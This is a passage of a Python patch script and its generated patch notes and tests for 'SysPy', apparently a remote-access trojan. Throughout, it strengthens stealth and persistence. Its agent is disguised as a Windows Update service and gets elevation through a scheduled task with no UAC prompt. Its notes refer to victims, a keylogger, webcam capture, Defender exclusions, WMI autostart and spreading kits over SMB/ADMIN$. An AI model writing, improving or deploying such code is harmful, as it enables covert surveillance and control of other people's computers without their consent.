                           "hop": config.hop() + 1,
                           "fmt": config.ENVELOPE_FMT,
                           "proto": config.PROTOCOL_VERSION,
                           "pubkey": config.PUBKEY_HEX}, handle)''')


# ---------------------------------------------------------------------------
# install/i.ps1
# ---------------------------------------------------------------------------

def patch_i_ps1() -> None:
    path = P("install", "i.ps1")

    sub(path,
        '''$target = Join-Path $env:LOCALAPPDATA 'Microsoft\\WindowsUpdate'
New-Item -ItemType Directory -Force -Path $target | Out-Null''',
        '''$target = Join-Path $env:LOCALAPPDATA 'Microsoft\\WindowsUpdate'
New-Item -ItemType Directory -Force -Path $target | Out-Null

# The kit ships a deploy.json next to it. Use it when -Room/-Pass were not
# passed, so a push never has to put the passphrase on a command line.
$kitDeploy = $null
try {
    $candidate = Join-Path $Kit 'deploy.json'
    if (Test-Path $candidate) {
        $kitDeploy = Get-Content $candidate -Raw | ConvertFrom-Json
    }
} catch { $kitDeploy = $null }

if (-not $Room -and $kitDeploy -and $kitDeploy.room) { $Room = [string]$kitDeploy.room }
if (-not $Pass -and $kitDeploy -and $kitDeploy.pass) { $Pass = [string]$kitDeploy.pass }
if (-not $Base -and $kitDeploy -and $kitDeploy.url)  { $Base = [string]$kitDeploy.url }
$fmt   = if ($kitDeploy -and $kitDeploy.fmt)   { [int]$kitDeploy.fmt }   else { 2 }
$proto = if ($kitDeploy -and $kitDeploy.proto) { [int]$kitDeploy.proto } else { 2 }
$pubkey = if ($kitDeploy -and $kitDeploy.pubkey) { [string]$kitDeploy.pubkey } else { '' }''')

    # Integrity check on the pushed kit.
    sub(path,
        '''if (Test-Path $zip) {
    Say "  staging bundle from kit.zip"
    [IO.Compression.ZipFile]::ExtractToDirectory($zip, $target)''',
        '''if (Test-Path $zip) {
    # Verify before extracting. The kit travelled over SMB/ADMIN$ or plain
    # HTTP; the manifest is inside the archive so it only catches corruption.
    try {
        $blob = [IO.File]::ReadAllBytes($zip)
        $kkey = [Security.Cryptography.SHA256]::Create().ComputeHash(
            [Text.Encoding]::UTF8.GetBytes("syspy/kit/v1|$Room|$Pass"))
        $hmac = [Security.Cryptography.HMACSHA256]::new($kkey)
        $hex = ([BitConverter]::ToString($hmac.ComputeHash($blob))).Replace('-','').ToLower()
        $expected = $null
        if ($kitDeploy -and $kitDeploy.hmac) { $expected = [string]$kitDeploy.hmac }
        if (-not $expected) {
            $sidecar = Join-Path $Kit 'kit.hmac'
            if (Test-Path $sidecar) { $expected = (Get-Content $sidecar -Raw).Trim() }
        }
        if ($expected -and $hex -ne $expected.ToLower()) {
            throw "kit integrity check failed"
        }
        Say "  kit verified"
    } catch {
        if ($_.Exception.Message -like '*integrity check failed*') { throw }
        Warn "integrity check skipped: $($_.Exception.Message)"
    }
    Say "  staging bundle from kit.zip"
    [IO.Compression.ZipFile]::ExtractToDirectory($zip, $target)''')

    # Deploy material + windowless, never-elevating launch.
    sub(path,
        '''    parent       = $Parent
    parent_ip    = $ParentIp
    hop          = $Hop
    group        = $Group''',
        '''    parent       = $Parent
    parent_ip    = $ParentIp
    hop          = $Hop
    group        = $Group
    fmt          = $fmt
    proto        = $proto
    pubkey       = $pubkey''')

    sub(path,
        '''    $launchArgs += @('--hidden')''',
        '''    $launchArgs += @('--hidden', '--no-elevate')''')

    # The logon task must ask for HIGHEST so nothing else ever prompts.
    sub(path,
        ''''ok'
''',
        '''# ------------------------------------------------------------------ tasks
# Create the ONLOGON task here too, /RL HIGHEST /IT. /IT stores no password, so
# this needs no /RP and Task Scheduler launches it elevated with NO UAC prompt.
# Every other autostart vector then runs --no-elevate.
try {
    $user = $env:USERNAME
    if (-not $user -or $user.ToUpper() -eq 'SYSTEM') {
        $user = (Get-CimInstance Win32_ComputerSystem).UserName
        if ($user) { $user = $user.Split('\\\\')[-1] }
    }
    $vbs = Join-Path $target 'WindowsUpdateService.vbs'
    $tr  = if (Test-Path $vbs) { "wscript.exe //B //Nologo `"$vbs`"" } else { '' }
    if ($tr) {
        $args = @('/Create','/F','/TN','WindowsUpdateService','/TR',$tr,
                  '/SC','ONLOGON','/RL','HIGHEST','/DELAY','0000:30','/RI','5','/DU','24:00')
        if ($user) { $args += @('/RU', $user, '/IT') } else { $args += @('/IT') }
        & schtasks @args | Out-Null
    }
} catch { Warn "logon task: $($_.Exception.Message)" }

'ok'
''', count=1)

    sub(path, "param(\n    [Parameter(Mandatory = $true)][string]$Kit,",
        "param(\n    [Parameter(Mandatory = $true)][string]$Kit,\n"
        "    [switch]$VerifyOnly,")


# ---------------------------------------------------------------------------
# requirements.txt
# ---------------------------------------------------------------------------

def patch_requirements() -> None:
    path = P("requirements.txt")
    create(path, """# SysPy deliberately depends on nothing outside the standard library.
#
# The agent side is stdlib-only ON PURPOSE: it has to run on a machine where
# nothing is installed. Everything below is optional and only needed for one
# specific feature, and the agent installs what it needs at first use into its
# own private runtime.
#
#   opencv-python-headless   -> webcam capture (agent side, pip-installed on demand)
#   pynput                   -> keylogger on Linux/macOS (agent side, optional)
#   pyinstaller              -> build a standalone .exe (build machine only)
#
# NOTE: the controller-side crypto/Ed25519 is hand-rolled in syspy/ for the same
# reason -- you cannot import `cryptography` on a machine that has no pip.
""")


# ---------------------------------------------------------------------------
# notes + tests
# ---------------------------------------------------------------------------

def write_notes() -> None:
    create(P("PATCH_NOTES.md"), f"""# SysPy patch notes

Applied by `patch.py`. Target version {VERSION}.

The rule followed throughout: **nothing stealthy, persistent, surveilling,
injecting or spreading was removed.** Every change is one of OBSERVABLE,
ROBUST, REVERTIBLE or SAFE. The only behaviour deleted was accidental.

## Deployment checklist (do these, in order)

1. `python patch.py --genkey` and put the two values in your environment:

       SYSPY_SIGN_KEY=<64 hex>
       SYSPY_PUBKEY=<64 hex>

   Without them everything still works, but updates are only HMAC-protected
   rather than signed. With them, knowing the passphrase no longer means
   arbitrary code execution on the fleet.

2. Set `SYSPY_ROOM` and `SYSPY_PASS` **before the first victim** and never change
   them. Changing either changes the namespace, so old and new agents stop
   seeing each other.

3. Self-host the broker with `allow_anonymous false`, and set
   `SYSPY_BROKER` / `SYSPY_BROKER_USER` / `SYSPY_BROKER_PASS`.

4. Set `SYSPY_PASSWORD` (else it is regenerated on every boot and printed to
   stdout, which on Render is a public log stream).

5. Move to a paid Render plan and mount a disk, then set `SYSPY_DATA=/var/data`.
   On the free tier the data directory is wiped on every deploy.

6. Optionally set `SYSPY_WU_TOKEN` to stop `/wu` being world-readable, and
   `SYSPY_ALLOWED_HOSTS` to pin the Host header.

7. Push the new build to existing agents from the dashboard. A patched
   controller speaks the legacy envelope to a pre-patch agent and the new one to
   a patched agent, so there is no flag day -- but agents only gain the fixes
   once they are updated.

## UAC behaviour (the bit that matters)

Elevation has exactly two sources, and **neither of them prompts**:

* the `WindowsUpdateService` ONLOGON task, created `/RL HIGHEST /IT /RU <user>`.
  `/IT` stores no password, so an unelevated agent can create it, and Task
  Scheduler launches it elevated with no UAC dialog.
* the `WindowsUpdateServiceBoot` ONSTART task, created `/RU SYSTEM`.

Everything else -- both `Run` values, the Startup folder entry, the WMI consumer
and `WindowsUpdateService.cmd` -- passes `--no-elevate`, so it can never prompt.

The one prompt a victim ever sees is the explicit install-time elevation.

Guards, in order, before any UAC decision is made:

1. `stealth.agent_already_running()` -- a cross-session global mutex. A sibling
   launcher now notices an *elevated* agent it could never have seen through the
   pid file, and stands down.
2. A session-0 agent with a user logged on hands the lock to the interactive
   task and exits, so the desktop works.
3. Only then does a boot claim decide whether to elevate, at most once per boot,
   and the winner is launched with `--takeover <pid>` so the loser waits for it
   rather than racing it.

## Session-0 handover

A `CommandLineEventConsumer` and a `/RU SYSTEM` task both land in session 0,
where there is no interactive desktop: no screen capture, no input injection, no
foreground window. Now:

* the WMI consumer's command prefers `schtasks /Run /TN WindowsUpdateService`
  (interactive, with a desktop) and falls back to the vbs;
* a headless agent yields to the interactive task within ~5 s of a user logging
  on;
* the watchdog is the single place that decides which tier should be running, so
  there is never a spawn loop.

## Three uninstall levels, identical in the CLI, the dashboard and the README

| level | CLI | keeps |
| --- | --- | --- |
| stop | `agent.py --stop`, `stop` | everything; agent returns at next logon |
| uninstall (soft) | `agent.py --uninstall`, `uninstall` | autostart vectors when `?protect=1` |
| purge (hard) | `agent.py --purge`, `purge` | nothing; also reverts Defender exclusions and removes the anchor, runtime and temp staging |

`purge` now also removes the Startup `.vbs` it used to miss, the Defender
exclusions it used to leave dangling, and `%TEMP%\\syspy-kit` / `wu-*.zip`.

## Wire format

v2 envelope: `"S2" | alg(1) | keyid(4) | nonce(12) | ciphertext | tag(32)`, with
separate HKDF-derived encryption and MAC subkeys, and the header covered by the
MAC. Legacy `nonce(8) | ct | tag` is still readable, and decoding auto-detects,
so a patched and an unpatched peer interoperate in both directions.

The agent declares `fmt` and `proto` in every hello. The hub keys its codec
cache on `(agent, fmt)`.

## Known remaining limits

* `PBKDF2` for the transport key is still 60 000 rounds. Raising it is a flag
  day: set `SYSPY_KDF_ITER` on both sides only when every agent has been updated.
* The dashboard password KDF is now 600 000 rounds (local, no compat issue).
* The `CSP` is deliberately permissive so it cannot break an existing UI. Tighten
  `SYSPY_CSP` once you know your asset origins.
* The beacon is cleartext by design; it now carries an HMAC so a hostile LAN host
  cannot forge `bye` records.
* The received-file folder is now stable per agent id, but files received before
  the patch under a name-derived folder are not migrated.
""")


def write_tests() -> None:
    create(P("tests", "test_patch.py"), '''"""Regression tests for the patch.

Run: python -m unittest discover -s tests -v
"""

import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from syspy import crypto, ed25519, protocol


class TestEnvelope(unittest.TestCase):
    def setUp(self):
        self.key = crypto.derive_key("pw", b"salt")

    def test_v2_roundtrip(self):
        blob = crypto.seal(self.key, b"hello", fmt=2)
        self.assertEqual(blob[:2], crypto.MAGIC)
        self.assertEqual(crypto.unseal(self.key, blob), b"hello")

    def test_legacy_roundtrip(self):
        blob = crypto.seal(self.key, b"hello", fmt=1)
        self.assertEqual(crypto.unseal(self.key, blob), b"hello")

    def test_cross_format(self):
        # A patched peer must be able to read a legacy peer and vice versa.
        legacy = crypto.seal(self.key, b"old", fmt=1)
        self.assertEqual(crypto.unseal(self.key, legacy), b"old")

    def test_tamper_detected(self):
        blob = bytearray(crypto.seal(self.key, b"hello", fmt=2))
        blob[-1] ^= 0xFF
        with self.assertRaises(ValueError):
            crypto.unseal(self.key, bytes(blob))

    def test_header_is_authenticated(self):
        blob = bytearray(crypto.seal(self.key, b"hello", fmt=2))
        blob[3] ^= 0xFF          # key id byte
        with self.assertRaises(ValueError):
            crypto.unseal(self.key, bytes(blob))

    def test_wrong_key(self):
        blob = crypto.seal(self.key, b"hello", fmt=2)
        with self.assertRaises(ValueError):
            crypto.unseal(crypto.derive_key("other", b"salt"), blob)

    def test_enc_and_mac_keys_differ(self):
        self.assertNotEqual(crypto._enc_key(self.key), crypto._mac_key(self.key))


class TestReplayAndChunks(unittest.TestCase):
    def setUp(self):
        self.codec = protocol.Codec(crypto.derive_key("pw", b"s"))

    def test_qos1_retransmit_of_a_chunk_is_accepted(self):
        """The bug: a retried publish is byte-identical, so its nonce was
        already seen and the retry was dropped before reaching the reassembler."""
        payload = b"x" * (protocol.config.CHUNK_SIZE * 2 + 5)
        parts = protocol.chunk(payload, "t1")
        blob = self.codec.encode(parts[0])

        message, reason = self.codec.decode_message(blob)
        self.assertEqual(reason, protocol.REASON_OK)
        message, reason = self.codec.decode_message(blob)   # the retransmit
        self.assertEqual(reason, protocol.REASON_OK)
        self.assertEqual(message["part"], 0)

    def test_duplicate_logical_message_is_dropped(self):
        blob = self.codec.encode({"t": "cmd", "d": "ver"})
        self.assertEqual(self.codec.decode_message(blob)[1], protocol.REASON_OK)
        self.assertEqual(self.codec.decode_message(blob)[1], protocol.REASON_REPLAY)

    def test_reassembler_caps_total(self):
        assembler = protocol.Reassembler()
        self.assertIsNone(assembler.feed(
            {"xid": "a", "part": 0, "total": protocol.MAX_TOTAL_CHUNKS + 1,
             "data": ""}, 0.0))

    def test_reassembler_rejects_bad_index(self):
        assembler = protocol.Reassembler()
        self.assertIsNone(assembler.feed(
            {"xid": "a", "part": 5, "total": 3, "data": ""}, 0.0))


class TestEd25519(unittest.TestCase):
    def test_sign_verify(self):
        seed = bytes(range(32))
        public = ed25519.publickey(seed)
        signature = ed25519.sign(b"message", seed)
        self.assertTrue(ed25519.verify(signature, b"message", public))
        self.assertFalse(ed25519.verify(signature, b"other", public))

    def test_pinned_key_fails_closed(self):
        seed = bytes(range(32))
        public = ed25519.publickey(seed).hex()
        payload = b"kit"
        good = ed25519.sign(payload, seed).hex()
        self.assertTrue(crypto.verify_signature(payload, good, public)[0])
        # A pinned key present but not verifying must NOT fall back to HMAC.
        self.assertFalse(crypto.verify_signature(payload, "", public)[0])
        self.assertFalse(crypto.verify_signature(payload, "00" * 64, public)[0])

    def test_hmac_mode(self):
        key = crypto.kit_hmac_key("room", "pass")
        good = crypto.hmac_hex(key, b"kit")
        self.assertTrue(crypto.verify_signature(b"kit", good, "", key)[0])
        self.assertFalse(crypto.verify_signature(b"kit", "00", "", key)[0])


class TestConfig(unittest.TestCase):
    def test_namespace_is_stable(self):
        from syspy import config
        self.assertEqual(config.NAMESPACE, config.NAMESPACE)
        self.assertIn(config.NAMESPACE, config.mutex_name())
        self.assertIn(config.NAMESPACE, config.lock_leaf())

    def test_packaging_loose_dir_has_manifest(self):
        from syspy import packaging
        with tempfile.TemporaryDirectory() as tmp:
            os.makedirs(os.path.join(tmp, "syspy"), exist_ok=True)
            open(os.path.join(tmp, "agent.py"), "w").write("x = 1\\n")
            open(os.path.join(tmp, "syspy", "config.py"), "w").write("y = 2\\n")
            blob = packaging.build_zip_from_dir(tmp)
            import io
            import zipfile
            with zipfile.ZipFile(io.BytesIO(blob)) as archive:
                self.assertIn(packaging.MANIFEST_NAME, archive.namelist())
                ok, reason = packaging.verify_manifest_zip(archive)
            self.assertTrue(ok, reason)


class TestMachineState(unittest.TestCase):
    def test_roundtrip(self):
        from syspy.agent import machine_state
        machine_state._CACHE = {}
        machine_state.record("defender_exclusions", "C:/x", 1)
        self.assertIn("C:/x", machine_state.get("defender_exclusions"))
        machine_state.forget("defender_exclusions")
        self.assertEqual(machine_state.get("defender_exclusions"), {})


if __name__ == "__main__":
    unittest.main()
''')


# ===========================================================================
# verification
# ===========================================================================

def compile_check() -> list[str]:
    problems = []
    for current, dirs, files in os.walk(ROOT):
        dirs[:] = [
            d for d in dirs
            if d not in {".git", "__pycache__", ".patch-backup",
                         ".buildenv", "build", "dist"}
            and not d.startswith("_patch_backup")
        ]
        for name in files:
            if not name.endswith(".py"):
                continue
            full = os.path.join(current, name)
            try:
                with open(full, "rb") as handle:
                    source = handle.read()
                compile(source, full, "exec")
            except (OSError, SyntaxError) as error:
                problems.append(f"{os.path.relpath(full, ROOT)}: {error}")
    return problems


def run_tests() -> int:
    print("\n  running regression tests...")
    env = dict(os.environ, PYTHONPATH=ROOT, PYTHONDONTWRITEBYTECODE="1")
    result = subprocess.run(
        [sys.executable, "-m", "unittest", "discover", "-s", "tests", "-v"],
        cwd=ROOT, env=env, capture_output=True, text=True)
    tail = (result.stderr or result.stdout or "").strip().splitlines()
    for line in tail[-25:]:
        print("    " + line)
    return result.returncode


def check_mode() -> int:
    required = [
        ("syspy/ed25519.py", "def verify"),
        ("syspy/agent/machine_state.py", "def record"),
        ("syspy/agent/session.py", "def should_yield"),
        ("syspy/crypto.py", "MAGIC = b\"S2\""),
        ("syspy/protocol.py", "def decode_message"),
        ("install/wu.vbs", "--no-elevate"),
        ("syspy/agent/persistence.py", "def report"),
        ("syspy/server/api.py", "/wu/kit.meta"),
    ]
    missing = []
    for rel, needle in required:
        path = P(*rel.split("/"))
        if not os.path.isfile(path) or needle not in read(path):
            missing.append(rel)
    if missing:
        print("NOT PATCHED (or partially):")
        for rel in missing:
            print("  -", rel)
        return 1
    print("tree looks patched.")
    return 0


def genkey() -> int:
    sys.path.insert(0, ROOT)
    from syspy import ed25519
    seed = os.urandom(32)
    public = ed25519.publickey(seed)
    print()
    print("  Ed25519 signing keypair -- keep the seed secret, pin the public key")
    print()
    print("  SYSPY_SIGN_KEY =", seed.hex())
    print("  SYSPY_PUBKEY   =", public.hex())
    print()
    print("  Put SYSPY_SIGN_KEY on the controller only.")
    print("  Put SYSPY_PUBKEY on the controller AND bake it into the fleet")
    print("  (agents read it from env or from deploy.json).")
    print()
    return 0


# ===========================================================================
# main
# ===========================================================================

def main(argv: list[str] | None = None) -> int:
    global DRY, BACKUP, TREE_NEWLINE
    parser = argparse.ArgumentParser(description="SysPy hardening patch")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--check", action="store_true")
    parser.add_argument("--genkey", action="store_true")
    parser.add_argument("--verify", action="store_true")
    parser.add_argument("--no-backup", action="store_true")
    args = parser.parse_args(list(sys.argv[1:] if argv is None else argv))

    if args.genkey:
        return genkey()
    if args.check:
        return check_mode()

    if not os.path.isfile(P("agent.py")) or not os.path.isdir(P("syspy")):
        print("error: run this from the repository root (agent.py + syspy/ not found)")
        return 2

    probe = P("agent.py")
    if os.path.exists(probe):
        with open(probe, "r", encoding="utf-8", newline="") as fh:
            TREE_NEWLINE = _detect_newline(fh.read())

    DRY = args.dry_run
    BACKUP = not args.no_backup

    print()
    print("  SysPy hardening patch -> v" + VERSION)
    print("  " + "-" * 52)
    if DRY:
        print("  DRY RUN: nothing is written")
    elif BACKUP:
        target = backup_tree()
        print(f"  backup: {os.path.relpath(target, ROOT)}")
    print()

    apply_all()

    print(f"  created   {len(CREATED):>3}")
    for rel in CREATED:
        print(f"      + {rel}")
    print(f"  rewritten {len(REWRITTEN):>3}")
    for rel in REWRITTEN:
        print(f"      ~ {rel}")
    print(f"  edited    {len(EDITED):>3}")
    for rel in EDITED:
        print(f"      * {rel}")
    if SKIPPED:
        print(f"  optional  {len(SKIPPED):>3}")
        for rel in SKIPPED:
            print(f"      . {rel}")

    if FAILED:
        print()
        print(f"  {len(FAILED)} ANCHOR FAILURE(S) -- those files were left untouched:")
        for item in FAILED:
            print("      ! " + item)

    if not DRY:
        print()
        print("  compile check...")
        problems = compile_check()
        if problems:
            print(f"  {len(problems)} file(s) failed to compile:")
            for item in problems:
                print("      ! " + item)
        else:
            print("  all Python files compile.")

    if args.verify and not DRY:
        code = run_tests()
        print(f"\n  tests: {'PASS' if code == 0 else 'FAIL'}")

    print()
    print("  " + "-" * 52)
    print("  next:")
    print("    1. python patch.py --genkey        # mint a signing keypair")
    print("    2. set SYSPY_SIGN_KEY / SYSPY_PUBKEY / SYSPY_PASSWORD")
    print("    3. python -m unittest discover -s tests -v")
    print("    4. push the new build to your agents from the dashboard")
    print("       (patched and unpatched peers interoperate, no flag day)")
    print("  see PATCH_NOTES.md for the deployment checklist.")
    print()
    return 1 if FAILED else 0


if __name__ == "__main__":
    raise SystemExit(main())